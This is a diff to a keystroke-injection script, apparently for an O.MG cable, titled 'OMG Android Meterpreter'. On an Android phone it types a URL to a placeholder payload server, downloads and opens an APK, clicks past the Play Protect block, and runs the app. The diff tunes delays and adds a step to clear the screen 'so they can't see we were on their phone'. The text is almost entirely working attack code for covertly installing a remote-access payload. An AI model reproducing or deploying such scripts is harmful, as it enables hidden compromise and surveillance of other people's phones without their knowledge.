@@ -1,11 +1,11 @@
 REM # -----------------------------------------------------------
 REM # Title: OMG Android Meterpreter
-REM # Description: Download and install an APK on Android. 
+REM # Description: Download and install an APK on Android.
 REM # You may need to change the script for your particular phone
 REM # model and Android version. Play around with it. Delays are very
-REM # important and makes a really big difference. 
-REM # 
-REM # Author: David Bombal 
+REM # important and makes a really big difference.
+REM #
+REM # Author: David Bombal
 REM # Target: Android 12 (Samsung Galaxy S22 Ultra)
 REM # Notes: Set URL for APK payload below
 REM # -----------------------------------------------------------
@@ -29,6 +29,7 @@ STRING http://xx.xx.xx.xx:8000/omg.apk
 ENTER
 DELAY 4000
 ENTER
+DELAY 2000
 
 REM # -----------------------------------------------------------
 REM # open apk with My Files
@@ -42,6 +43,14 @@ TAB
 DELAY 100
 TAB
 DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 100
 ENTER
 DELAY 100
 TAB
@@ -51,7 +60,7 @@ ENTER
 REM # -----------------------------------------------------------
 REM # blocked by Play Protect
 REM # -----------------------------------------------------------
-DELAY 50
+DELAY 100
 TAB
 DELAY 1000
 TAB
@@ -68,11 +77,7 @@ REM # -----------------------------------------------------------
 REM # Run App
 REM # -----------------------------------------------------------
 
-DELAY 1000
-TAB
-DELAY 1000
-TAB
-DELAY 1000
+DELAY 8000
 ENTER
 
 REM # -----------------------------------------------------------
@@ -102,3 +107,11 @@ ENTER
 DELAY 500
 TAB
 ENTER
+
+REM # -----------------------------------------------------------
+REM # clear screen (So they can't see we were on their phone)
+REM # -----------------------------------------------------------
+
+GUI ENTER
+DELAY 1000
+GUI ENTER
